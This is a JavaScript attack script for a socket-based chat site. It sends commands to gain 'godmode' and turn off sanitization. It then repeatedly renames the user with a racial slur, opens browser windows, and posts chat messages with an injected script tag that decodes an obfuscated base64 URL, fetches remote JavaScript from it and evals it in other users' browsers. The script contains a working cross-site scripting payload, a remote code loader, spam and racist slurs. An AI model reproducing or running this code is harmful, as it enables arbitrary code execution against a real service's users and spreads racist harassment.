let meniggertimer = 7500; // Changed from const to let
socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "me nigger"]
    });
    window.open("https://www.youtube.com/watch?v=C5q55CbCLqc&t=92s", "_blank");
    socket.emit('talk', { text: "me nigger <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'COUGHSPR'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
    meniggertimer = meniggertimer - 125;
}, meniggertimer);